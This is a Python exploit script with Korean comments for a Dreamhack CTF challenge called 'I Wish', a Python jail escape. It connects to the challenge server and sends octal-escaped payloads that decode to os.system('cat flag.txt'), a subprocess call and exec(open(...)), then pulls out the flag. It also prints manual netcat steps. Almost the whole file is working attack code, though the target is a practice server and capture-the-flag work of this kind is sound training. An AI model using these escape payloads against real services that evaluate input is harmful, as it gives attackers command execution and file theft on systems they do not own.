#!/usr/bin/env python3
"""
I Wish CTF Exploit
Target: host1.dreamhack.games:13051
"""

import socket
import time

def send_exploit(host='host1.dreamhack.games', port=13051):
    """서버에 8진수 페이로드 전송"""
    
    print("="*60)
    print(" I Wish CTF Exploit")
    print("="*60)
    print(f"🎯 Target: {host}:{port}\n")
    
    # 페이로드: __import__('os').system('cat flag.txt')
    payload = '"\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\047\\157\\163\\047\\051\\056\\163\\171\\163\\164\\145\\155\\050\\047\\143\\141\\164\\040\\146\\154\\141\\147\\056\\164\\170\\164\\047\\051"'
    
    print("📦 Payload (8진수 이스케이프):")
    print(f"   {payload}\n")
    print("📝 디코딩된 명령어:")
    print("   __import__('os').system('cat flag.txt')\n")
    
    try:
        # 소켓 연결
        print("[*] 서버 연결 중...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        print("[+] 연결 성공!\n")
        
        # 초기 메시지 받기
        time.sleep(0.5)
        data = s.recv(1024).decode()
        print(f"[서버 메시지]\n{data}")
        
        # 페이로드 전송
        print(f"\n[*] 페이로드 전송 중...")
        s.send(payload.encode() + b'\n')
        print("[+] 전송 완료!\n")
        
        # 응답 받기
        time.sleep(0.5)
        response = s.recv(4096).decode()
        print(f"[서버 응답]")
        print("-"*40)
        print(response)
        print("-"*40)
        
        # 플래그 찾기
        if 'DH{' in response:
            flag_start = response.index('DH{')
            flag_end = response.index('}', flag_start) + 1
            flag = response[flag_start:flag_end]
            print(f"\n{'='*60}")
            print(f" 🎉 FLAG FOUND: {flag}")
            print(f"{'='*60}\n")
            return flag
        else:
            print("\n[!] 플래그를 찾을 수 없습니다.")
            print("[!] 다른 페이로드를 시도해보세요.")
            
        s.close()
        
    except socket.timeout:
        print("[-] 연결 시간 초과")
    except ConnectionRefusedError:
        print("[-] 연결 거부됨. 포트 번호를 확인하세요.")
    except Exception as e:
        print(f"[-] 오류 발생: {e}")
    
    return None

def try_alternative_payloads(host='host1.dreamhack.games', port=13051):
    """여러 페이로드 시도"""
    
    payloads = [
        # 1. print(open('flag.txt').read())
        ('"\\160\\162\\151\\156\\164\\050\\157\\160\\145\\156\\050\\047\\146\\154\\141\\147\\056\\164\\170\\164\\047\\051\\056\\162\\145\\141\\144\\050\\051\\051"',
         "print(open('flag.txt').read())"),
        
        # 2. __import__('subprocess').run(['cat','flag.txt'])
        ('"\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\047\\163\\165\\142\\160\\162\\157\\143\\145\\163\\163\\047\\051\\056\\162\\165\\156\\050\\133\\047\\143\\141\\164\\047\\054\\047\\146\\154\\141\\147\\056\\164\\170\\164\\047\\135\\051"',
         "__import__('subprocess').run(['cat','flag.txt'])"),
         
        # 3. exec(open('flag.txt').read()) - 파일 내용 실행
        ('"\\145\\170\\145\\143\\050\\157\\160\\145\\156\\050\\047\\146\\154\\141\\147\\056\\164\\170\\164\\047\\051\\056\\162\\145\\141\\144\\050\\051\\051"',
         "exec(open('flag.txt').read())"),
    ]
    
    print("\n다른 페이로드들을 시도합니다...\n")
    
    for i, (payload, description) in enumerate(payloads, 1):
        print(f"\n[시도 {i}] {description}")
        print(f"페이로드: {payload[:50]}...")
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # 초기 메시지 받기
            s.recv(1024)
            
            # 페이로드 전송
            s.send(payload.encode() + b'\n')
            
            # 응답 받기
            time.sleep(0.5)
            response = s.recv(4096).decode()
            
            if 'DH{' in response:
                flag_start = response.index('DH{')
                flag_end = response.index('}', flag_start) + 1
                flag = response[flag_start:flag_end]
                print(f"✅ 성공! 플래그: {flag}")
                return flag
            else:
                print("❌ 플래그 없음")
                
            s.close()
            
        except Exception as e:
            print(f"❌ 실패: {e}")
            continue
    
    return None

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║        I Wish CTF Exploit Tool        ║
    ║         Python Jail Escape            ║
    ╚═══════════════════════════════════════╝
    """)
    
    # 메인 페이로드 시도
    flag = send_exploit()
    
    # 실패 시 대체 페이로드 시도
    if not flag:
        print("\n[!] 메인 페이로드 실패. 대체 페이로드 시도 중...")
        flag = try_alternative_payloads()
    
    if flag:
        print(f"\n최종 플래그: {flag}")
        print("\n축하합니다! 🎊")
    else:
        print("\n[!] 수동으로 시도해보세요:")
        print("1. nc host1.dreamhack.games 13051")
        print("2. 아래 페이로드 입력:")
        print('"\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\047\\157\\163\\047\\051\\056\\163\\171\\163\\164\\145\\155\\050\\047\\143\\141\\164\\040\\146\\154\\141\\147\\056\\164\\170\\164\\047\\051"')

if __name__ == "__main__":
    main()